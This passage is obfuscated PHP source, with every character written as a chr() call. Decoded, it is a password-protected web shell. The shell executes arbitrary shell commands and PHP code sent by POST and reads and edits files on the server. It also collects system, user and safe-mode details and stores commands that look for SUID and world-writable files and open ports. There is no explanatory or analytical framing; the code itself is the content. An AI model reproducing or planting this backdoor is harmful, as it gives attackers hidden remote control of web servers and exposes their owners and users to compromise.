r(67).chr(111).chr(117).chr(108).chr(100).chr(32).chr(110).chr(111).chr(116).chr(32).chr(99).chr(104).chr(97).chr(110).chr(103).chr(101).chr(32).chr(108).chr(97).chr(115).chr(116).chr(32).chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(116).chr(105).chr(109).chr(101).chr(33).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(123).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(83).chr(97).chr(118).chr(105).chr(110).chr(103).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(33).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(114).chr(101).chr(116).chr(117).chr(114).chr(110).chr(32).chr(36).chr(111).chr(117).chr(116).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(32).chr(102).chr(105).chr(108).chr(101).chr(95).chr(115).chr(105).chr(122).chr(101).chr(40).chr(36).chr(102).chr(41).chr(123).chr(13).chr(10).chr(36).chr(115).chr(105).chr(122).chr(101).chr(32).chr(61).chr(32).chr(102).chr(105).chr(108).chr(101).chr(115).chr(105).chr(122).chr(101).chr(40).chr(36).chr(102).chr(41).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(36).chr(115).chr(105).chr(122).chr(101).chr(32).chr(60).chr(32).chr(49).chr(48).chr(50).chr(52).chr(41).chr(32).chr(36).chr(115).chr(105).chr(122).chr(101).chr(32).chr(61).chr(32).chr(36).chr(115).chr(105).chr(122).chr(101).chr(46).chr(39).chr(38).chr(110).chr(98).chr(115).chr(112).chr(59).chr(98).chr(39).chr(59).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(36).chr(115).chr(105).chr(122).chr(101).chr(32).chr(60).chr(32).chr(49).chr(48).chr(52).chr(56).chr(53).chr(55).chr(54).chr(41).chr(32).chr(36).chr(115).chr(105).chr(122).chr(101).chr(32).chr(61).chr(32).chr(114).chr(111).chr(117).chr(110).chr(100).chr(40).chr(36).chr(115).chr(105).chr(122).chr(101).chr(47).chr(49).chr(48).chr(50).chr(52).chr(42).chr(49).chr(48).chr(48).chr(41).chr(47).chr(49).chr(48).chr(48).chr(32).chr(46).chr(32).chr(39).chr(38).chr(110).chr(98).chr(115).chr(112).chr(59).chr(75).chr(98).chr(39).chr(59).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(36).chr(115).chr(105).chr(122).chr(101).chr(32).chr(60).chr(32).chr(49).chr(48).chr(55).chr(51).chr(55).chr(52).chr(49).chr(56).chr(50).chr(52).chr(41).chr(32).chr(36).chr(115).chr(105).chr(122).chr(101).chr(61).chr(114).chr(111).chr(117).chr(110).chr(100).chr(40).chr(36).chr(115).chr(105).chr(122).chr(101).chr(47).chr(49).chr(48).chr(52).chr(56).chr(53).chr(55).chr(54).chr(42).chr(49).chr(48).chr(48).chr(41).chr(47).chr(49).chr(48).chr(48).chr(32).chr(46).chr(32).chr(39).chr(38).chr(110).chr(98).chr(115).chr(112).chr(59).chr(77).chr(98).chr(39).chr(59).chr(13).chr(10).chr(114).chr(101).chr(116).chr(117).chr(114).chr(110).chr(32).chr(36).chr(115).chr(105).chr(122).chr(101).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(36).chr(122).chr(122).chr(122).chr(61).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(122).chr(122).chr(122).chr(39).chr(93).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(95).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(40).chr(39).chr(110).chr(97).chr(116).chr(99).chr(97).chr(115).chr(101).chr(115).chr(111).chr(114).chr(116).chr(39).chr(41).chr(41).chr(123).chr(13).chr(10).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(32).chr(110).chr(97).chr(116).chr(99).chr(97).chr(115).chr(101).chr(115).chr(111).chr(114).chr(116).chr(40).chr(36).chr(97).chr(114).chr(114).chr(41).chr(123).chr(13).chr(10).chr(114).chr(101).chr(116).chr(117).chr(114).chr(110).chr(32).chr(115).chr(111).chr(114).chr(116).chr(40).chr(36).chr(97).chr(114).chr(114).chr(41).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(100).chr(105).chr(114).chr(39).chr(93).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(100).chr(105).chr(114).chr(32).chr(61).chr(32).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(100).chr(105).chr(114).chr(39).chr(93).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(64).chr(99).chr(104).chr(100).chr(105).chr(114).chr(40).chr(36).chr(100).chr(105).chr(114).chr(41).chr(41).chr(32).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(99).chr(104).chr(100).chr(105).chr(114).chr(40).chr(41).chr(32).chr(102).chr(97).chr(105).chr(108).chr(108).chr(101).chr(100).chr(33).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(36).chr(100).chr(105).chr(114).chr(32).chr(61).chr(32).chr(103).chr(101).chr(116).chr(99).chr(119).chr(100).chr(40).chr(41).chr(59).chr(13).chr(10).chr(13).chr(10).chr(40).chr(115).chr(116).chr(114).chr(108).chr(101).chr(110).chr(40).chr(36).chr(100).chr(105).chr(114).chr(41).chr(32).chr(62).chr(32).chr(49).chr(32).chr(38).chr(38).chr(32).chr(36).chr(100).chr(105).chr(114).chr(91).chr(49).chr(93).chr(32).chr(61).chr(61).chr(32).chr(39).chr(58).chr(39).chr(41).chr(32).chr(63).chr(32).chr(36).chr(111).chr(115).chr(95).chr(116).chr(121).chr(112).chr(101).chr(32).chr(61).chr(32).chr(39).chr(119).chr(105).chr(110).chr(39).chr(32).chr(58).chr(32).chr(36).chr(111).chr(115).chr(95).chr(116).chr(121).chr(112).chr(101).chr(32).chr(61).chr(32).chr(39).chr(110).chr(105).chr(120).chr(39).chr(59).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(36).chr(111).chr(115).chr(95).chr(110).chr(97).chr(109).chr(101).chr(32).chr(61).chr(32).chr(64).chr(112).chr(104).chr(112).chr(95).chr(117).chr(110).chr(97).chr(109).chr(101).chr(40).chr(41).chr(41).chr(123).chr(13).chr(10).chr(105).chr(102).chr(40).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(95).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(40).chr(39).chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(117).chr(110).chr(97).chr(109).chr(101).chr(39).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(111).chr(115).chr(95).chr(110).chr(97).chr(109).chr(101).chr(32).chr(61).chr(32).chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(117).chr(110).chr(97).chr(109).chr(101).chr(40).chr(41).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(36).chr(111).chr(115).chr(95).chr(110).chr(97).chr(109).chr(101).chr(32).chr(33).chr(61).chr(32).chr(103).chr(101).chr(116).chr(101).chr(110).chr(118).chr(40).chr(39).chr(79).chr(83).chr(39).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(111).chr(115).chr(95).chr(110).chr(97).chr(109).chr(101).chr(32).chr(61).chr(32).chr(39).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(40).chr(102).chr(117).chr(110).chr(99).chr(116).chr(105).chr(111).chr(110).chr(95).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(40).chr(39).chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100).chr(39).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(100).chr(97).chr(116).chr(97).chr(32).chr(61).chr(32).chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100).chr(40).chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(117).chr(105).chr(100).chr(40).chr(41).chr(41).chr(59).chr(13).chr(10).chr(36).chr(117).chr(115).chr(101).chr(114).chr(32).chr(61).chr(32).chr(36).chr(100).chr(97).chr(116).chr(97).chr(91).chr(39).chr(110).chr(97).chr(109).chr(101).chr(39).chr(93).chr(46).chr(39).chr(32).chr(117).chr(105).chr(100).chr(40).chr(39).chr(46).chr(36).chr(100).chr(97).chr(116).chr(97).chr(91).chr(39).chr(117).chr(105).chr(100).chr(39).chr(93).chr(46).chr(39).chr(41).chr(32).chr(103).chr(105).chr(100).chr(40).chr(39).chr(46).chr(36).chr(100).chr(97).chr(116).chr(97).chr(91).chr(39).chr(103).chr(105).chr(100).chr(39).chr(93).chr(46).chr(39).chr(41).chr(39).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(123).chr(13).chr(10).chr(36).chr(117).chr(115).chr(101).chr(114).chr(32).chr(61).chr(32).chr(39).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(36).chr(115).chr(97).chr(102).chr(101).chr(95).chr(109).chr(111).chr(100).chr(101).chr(32).chr(61).chr(32).chr(103).chr(101).chr(116).chr(95).chr(99).chr(102).chr(103).chr(95).chr(118).chr(97).chr(114).chr(40).chr(39).chr(115).chr(97).chr(102).chr(101).chr(95).chr(109).chr(111).chr(100).chr(101).chr(39).chr(41).chr(59).chr(13).chr(10).chr(36).chr(115).chr(97).chr(102).chr(101).chr(95).chr(109).chr(111).chr(100).chr(101).chr(32).chr(63).chr(32).chr(36).chr(115).chr(97).chr(102).chr(101).chr(32).chr(61).chr(32).chr(39).chr(111).chr(110).chr(39).chr(32).chr(58).chr(32).chr(36).chr(115).chr(97).chr(102).chr(101).chr(32).chr(61).chr(32).chr(39).chr(111).chr(102).chr(102).chr(39).chr(59).chr(13).chr(10).chr(13).chr(10).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(39).chr(101).chr(99).chr(104).chr(111).chr(32).chr(115).chr(115).chr(112).chr(115).chr(39).chr(41).chr(32).chr(63).chr(32).chr(36).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(32).chr(61).chr(32).chr(39).chr(111).chr(110).chr(39).chr(32).chr(58).chr(32).chr(36).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(32).chr(61).chr(32).chr(39).chr(111).chr(102).chr(102).chr(39).chr(59).chr(13).chr(10).chr(13).chr(10).chr(36).chr(115).chr(101).chr(114).chr(118).chr(101).chr(114).chr(32).chr(61).chr(32).chr(103).chr(101).chr(116).chr(101).chr(110).chr(118).chr(40).chr(39).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(83).chr(79).chr(70).chr(84).chr(87).chr(65).chr(82).chr(69).chr(39).chr(41).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(36).chr(115).chr(101).chr(114).chr(118).chr(101).chr(114).chr(41).chr(32).chr(36).chr(115).chr(101).chr(114).chr(118).chr(101).chr(114).chr(32).chr(61).chr(32).chr(39).chr(45).chr(45).chr(45).chr(39).chr(59).chr(13).chr(10).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(39).chr(59).chr(13).chr(10).chr(36).chr(116).chr(97).chr(105).chr(108).chr(32).chr(61).chr(32).chr(39).chr(39).chr(59).chr(13).chr(10).chr(36).chr(97).chr(108).chr(105).chr(97).chr(115).chr(101).chr(115).chr(32).chr(61).chr(32).chr(39).chr(39).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(36).chr(115).chr(97).chr(102).chr(101).chr(95).chr(109).chr(111).chr(100).chr(101).chr(41).chr(123).chr(13).chr(10).chr(105).chr(102).chr(40).chr(36).chr(111).chr(115).chr(95).chr(116).chr(121).chr(112).chr(101).chr(32).chr(61).chr(61).chr(32).chr(39).chr(110).chr(105).chr(120).chr(39).chr(41).chr(123).chr(13).chr(10).chr(36).chr(111).chr(115).chr(32).chr(46).chr(61).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(39).chr(115).chr(121).chr(115).chr(99).chr(116).chr(108).chr(32).chr(45).chr(110).chr(32).chr(107).chr(101).chr(114).chr(110).chr(46).chr(111).chr(115).chr(116).chr(121).chr(112).chr(101).chr(39).chr(41).chr(59).chr(13).chr(10).chr(36).chr(111).chr(115).chr(32).chr(46).chr(61).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(39).chr(115).chr(121).chr(115).chr(99).chr(116).chr(108).chr(32).chr(45).chr(110).chr(32).chr(107).chr(101).chr(114).chr(110).chr(46).chr(111).chr(115).chr(114).chr(101).chr(108).chr(101).chr(97).chr(115).chr(101).chr(39).chr(41).chr(59).chr(13).chr(10).chr(36).chr(111).chr(115).chr(32).chr(46).chr(61).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(39).chr(115).chr(121).chr(115).chr(99).chr(116).chr(108).chr(32).chr(45).chr(110).chr(32).chr(107).chr(101).chr(114).chr(110).chr(101).chr(108).chr(46).chr(111).chr(115).chr(116).chr(121).chr(112).chr(101).chr(39).chr(41).chr(59).chr(13).chr(10).chr(36).chr(111).chr(115).chr(32).chr(46).chr(61).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(39).chr(115).chr(121).chr(115).chr(99).chr(116).chr(108).chr(32).chr(45).chr(110).chr(32).chr(107).chr(101).chr(114).chr(110).chr(101).chr(108).chr(46).chr(111).chr(115).chr(114).chr(101).chr(108).chr(101).chr(97).chr(115).chr(101).chr(39).chr(41).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(117).chr(115).chr(101).chr(114).chr(41).chr(41).chr(32).chr(36).chr(117).chr(115).chr(101).chr(114).chr(32).chr(61).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(39).chr(105).chr(100).chr(39).chr(41).chr(59).chr(13).chr(10).chr(36).chr(97).chr(108).chr(105).chr(97).chr(115).chr(101).chr(115).chr(32).chr(61).chr(32).chr(97).chr(114).chr(114).chr(97).chr(121).chr(40).chr(13).chr(10).chr(39).chr(39).chr(32).chr(61).chr(62).chr(32).chr(39).chr(39).chr(44).chr(13).chr(10).chr(39).chr(102).chr(105).chr(110).chr(100).chr(32).chr(115).chr(117).chr(105).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(115).chr(39).chr(61).chr(62).chr(39).chr(102).chr(105).chr(110).chr(100).chr(32).chr(47).chr(32).chr(45).chr(116).chr(121).chr(112).chr(101).chr(32).chr(102).chr(32).chr(45).chr(112).chr(101).chr(114).chr(109).chr(32).chr(45).chr(48).chr(52).chr(48).chr(48).chr(48).chr(32).chr(45).chr(108).chr(115).chr(39).chr(44).chr(13).chr(10).chr(39).chr(102).chr(105).chr(110).chr(100).chr(32).chr(115).chr(103).chr(105).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(115).chr(39).chr(61).chr(62).chr(39).chr(102).chr(105).chr(110).chr(100).chr(32).chr(47).chr(32).chr(45).chr(116).chr(121).chr(112).chr(101).chr(32).chr(102).chr(32).chr(45).chr(112).chr(101).chr(114).chr(109).chr(32).chr(45).chr(48).chr(50).chr(48).chr(48).chr(48).chr(32).chr(45).chr(108).chr(115).chr(39).chr(44).chr(13).chr(10).chr(39).chr(102).chr(105).chr(110).chr(100).chr(32).chr(97).chr(108).chr(108).chr(32).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(115).chr(32).chr(105).chr(110).chr(32).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(32).chr(100).chr(105).chr(114).chr(39).chr(61).chr(62).chr(39).chr(102).chr(105).chr(110).chr(100).chr(32).chr(46).chr(32).chr(45).chr(116).chr(121).chr(112).chr(101).chr(32).chr(102).chr(32).chr(45).chr(112).chr(101).chr(114).chr(109).chr(32).chr(45).chr(50).chr(32).chr(45).chr(108).chr(115).chr(39).chr(44).chr(13).chr(10).chr(39).chr(102).chr(105).chr(110).chr(100).chr(32).chr(97).chr(108).chr(108).chr(32).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101).chr(32).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(105).chr(101).chr(115).chr(32).chr(105).chr(110).chr(32).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(32).chr(100).chr(105).chr(114).chr(39).chr(61).chr(62).chr(39).chr(102).chr(105).chr(110).chr(100).chr(32).chr(46).chr(32).chr(45).chr(116).chr(121).chr(112).chr(101).chr(32).chr(100).chr(32).chr(45).chr(112).chr(101).chr(114).chr(109).chr(32).chr(45).chr(50).chr(32).chr(45).chr(108).chr(115).chr(39).chr(44).chr(13).chr(10).chr(39).chr(102).chr(105).chr(110).chr(100).chr(32).chr(97).chr(108).chr(108).chr(32).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101).chr(32).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(105).chr(101).chr(115).chr(32).chr(97).chr(110).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(115).chr(32).chr(105).chr(110).chr(32).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(32).chr(100).chr(105).chr(114).chr(39).chr(61).chr(62).chr(39).chr(102).chr(105).chr(110).chr(100).chr(32).chr(46).chr(32).chr(45).chr(112).chr(101).chr(114).chr(109).chr(32).chr(45).chr(50).chr(32).chr(45).chr(108).chr(115).chr(39).chr(44).chr(13).chr(10).chr(39).chr(115).chr(104).chr(111).chr(119).chr(32).chr(111).chr(112).chr(101).chr(110).chr(101).chr(100).chr(32).chr(112).chr(111).chr(114).chr(116).chr(115).chr(39).chr(61).chr(62).chr(39).chr(110).chr(101).chr(116).chr(115).chr(116).chr(97).chr(116).chr(32).chr(45).chr(97).chr(110).chr(32).chr(124).chr(32).chr(103).chr(114).chr(101).chr(112).chr(32).chr(45).chr(105).chr(32).chr(108).chr(105).chr(115).chr(116).chr(101).chr(110).chr(39).chr(41).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(123).chr(13).chr(10).chr(36).chr(111).chr(115).chr(95).chr(110).chr(97).chr(109).chr(101).chr(32).chr(46).chr(61).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(39).chr(118).chr(101).chr(114).chr(39).chr(41).chr(59).chr(13).chr(10).chr(36).chr(117).chr(115).chr(101).chr(114).chr(32).chr(46).chr(61).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(39).chr(101).chr(99).chr(104).chr(111).chr(32).chr(37).chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101).chr(37).chr(39).chr(41).chr(59).chr(13).chr(10).chr(36).chr(97).chr(108).chr(105).chr(97).chr(115).chr(101).chr(115).chr(32).chr(61).chr(32).chr(97).chr(114).chr(114).chr(97).chr(121).chr(40).chr(13).chr(10).chr(39).chr(39).chr(32).chr(61).chr(62).chr(32).chr(39).chr(39).chr(44).chr(13).chr(10).chr(39).chr(115).chr(104).chr(111).chr(119).chr(32).chr(114).chr(117).chr(110).chr(105).chr(110).chr(103).chr(32).chr(115).chr(101).chr(114).chr(118).chr(105).chr(99).chr(101).chr(115).chr(39).chr(32).chr(61).chr(62).chr(32).chr(39).chr(110).chr(101).chr(116).chr(32).chr(115).chr(116).chr(97).chr(114).chr(116).chr(39).chr(44).chr(13).chr(10).chr(39).chr(115).chr(104).chr(111).chr(119).chr(32).chr(112).chr(114).chr(111).chr(99).chr(101).chr(115).chr(115).chr(32).chr(108).chr(105).chr(115).chr(116).chr(39).chr(32).chr(61).chr(62).chr(32).chr(39).chr(116).chr(97).chr(115).chr(107).chr(108).chr(105).chr(115).chr(116).chr(39).chr(41).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(60).chr(60).chr(60).chr(104).chr(101).chr(114).chr(101).chr(13).chr(10).chr(60).chr(115).chr(116).chr(121).chr(108).chr(101).chr(62).chr(13).chr(10).chr(116).chr(97).chr(98).chr(108).chr(101).chr(32).chr(123).chr(102).chr(111).chr(110).chr(116).chr(58).chr(57).chr(112).chr(116).chr(32).chr(84).chr(97).chr(104).chr(111).chr(109).chr(97).chr(59).chr(98).chr(111).chr(114).chr(100).chr(101).chr(114).chr(45).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(119).chr(104).chr(105).chr(116).chr(101).chr(125).chr(13).chr(10).chr(105).chr(110).chr(112).chr(117).chr(116).chr(44).chr(115).chr(101).chr(108).chr(101).chr(99).chr(116).chr(44).chr(102).chr(105).chr(108).chr(101).chr(32).chr(123).chr(98).chr(97).chr(99).chr(107).chr(103).chr(114).chr(111).chr(117).chr(110).chr(100).chr(45).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(35).chr(101).chr(101).chr(101).chr(101).chr(101).chr(101).chr(125).chr(13).chr(10).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(32).chr(123).chr(98).chr(97).chr(99).chr(107).chr(103).chr(114).chr(111).chr(117).chr(110).chr(100).chr(45).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(35).chr(102).chr(50).chr(102).chr(50).chr(102).chr(50).chr(125).chr(13).chr(10).chr(13).chr(10).chr(60).chr(47).chr(115).chr(116).chr(121).chr(108).chr(101).chr(62).chr(13).chr(10).chr(60).chr(98).chr(114).chr(62).chr(13).chr(10).chr(60).chr(99).chr(101).chr(110).chr(116).chr(101).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(97).chr(98).chr(108).chr(101).chr(32).chr(99).chr(101).chr(108).chr(108).chr(112).chr(97).chr(100).chr(100).chr(105).chr(110).chr(103).chr(61).chr(49).chr(32).chr(99).chr(101).chr(108).chr(108).chr(115).chr(112).chr(97).chr(99).chr(105).chr(110).chr(103).chr(61).chr(48).chr(32).chr(98).chr(111).chr(114).chr(100).chr(101).chr(114).chr(61).chr(49).chr(32).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(54).chr(53).chr(48).chr(32).chr(98).chr(103).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(115).chr(105).chr(108).chr(118).chr(101).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(102).chr(111).chr(114).chr(109).chr(32).chr(109).chr(101).chr(116).chr(104).chr(111).chr(100).chr(61).chr(112).chr(111).chr(115).chr(116).chr(62).chr(13).chr(10).chr(60).chr(116).chr(97).chr(98).chr(108).chr(101).chr(32).chr(99).chr(101).chr(108).chr(108).chr(112).chr(97).chr(100).chr(100).chr(105).chr(110).chr(103).chr(61).chr(49).chr(32).chr(99).chr(101).chr(108).chr(108).chr(115).chr(112).chr(97).chr(99).chr(105).chr(110).chr(103).chr(61).chr(48).chr(32).chr(98).chr(111).chr(114).chr(100).chr(101).chr(114).chr(61).chr(49).chr(32).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(54).chr(53).chr(48).chr(62).chr(13).chr(10).chr(104).chr(101).chr(114).chr(101).chr(59).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(32).chr(40).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(122).chr(122).chr(122).chr(41).chr(32).chr(124).chr(124).chr(32).chr(109).chr(100).chr(53).chr(40).chr(36).chr(122).chr(122).chr(122).chr(41).chr(33).chr(61).chr(61).chr(39).chr(102).chr(55).chr(50).chr(53).chr(51).chr(54).chr(52).chr(98).chr(56).chr(57).chr(100).chr(102).chr(99).chr(56).chr(99).chr(55).chr(52).chr(55).chr(97).chr(55).chr(51).chr(102).chr(98).chr(53).chr(50).chr(98).chr(56).chr(102).chr(100).chr(101).chr(99).chr(98).chr(39).chr(41).chr(13).chr(10).chr(123).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(60).chr(60).chr(60).chr(104).chr(101).chr(114).chr(101).chr(13).chr(10).chr(60).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(32).chr(97).chr(108).chr(105).chr(103).chr(110).chr(61).chr(99).chr(101).chr(110).chr(116).chr(101).chr(114).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(116).chr(101).chr(120).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(122).chr(122).chr(122).chr(32).chr(115).chr(105).chr(122).chr(101).chr(61).chr(49).chr(54).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(123).chr(36).chr(122).chr(122).chr(122).chr(125).chr(34).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(97).chr(98).chr(108).chr(101).chr(62).chr(13).chr(10).chr(13).chr(10).chr(104).chr(101).chr(114).chr(101).chr(59).chr(13).chr(10).chr(100).chr(105).chr(101).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(99).chr(109).chr(100).chr(39).chr(93).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(99).chr(109).chr(100).chr(39).chr(93).chr(41).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(112).chr(104).chr(112).chr(39).chr(93).chr(41).chr(41).chr(123).chr(13).chr(10).chr(111).chr(98).chr(95).chr(115).chr(116).chr(97).chr(114).chr(116).chr(40).chr(41).chr(59).chr(13).chr(10).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(112).chr(104).chr(112).chr(39).chr(93).chr(41).chr(59).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(111).chr(98).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40).chr(41).chr(59).chr(13).chr(10).chr(111).chr(98).chr(95).chr(101).chr(110).chr(100).chr(95).chr(99).chr(108).chr(101).chr(97).chr(110).chr(40).chr(41).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(101).chr(100).chr(105).chr(116).chr(39).chr(93).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(102).chr(105).chr(108).chr(101).chr(32).chr(61).chr(32).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(101).chr(100).chr(105).chr(116).chr(39).chr(93).chr(59).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(114).chr(101).chr(97).chr(100).chr(40).chr(36).chr(102).chr(105).chr(108).chr(101).chr(41).chr(59).chr(13).chr(10).chr(36).chr(116).chr(97).chr(105).chr(108).chr(32).chr(61).chr(32).chr(39).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(100).chr(105).chr(114).chr(32).c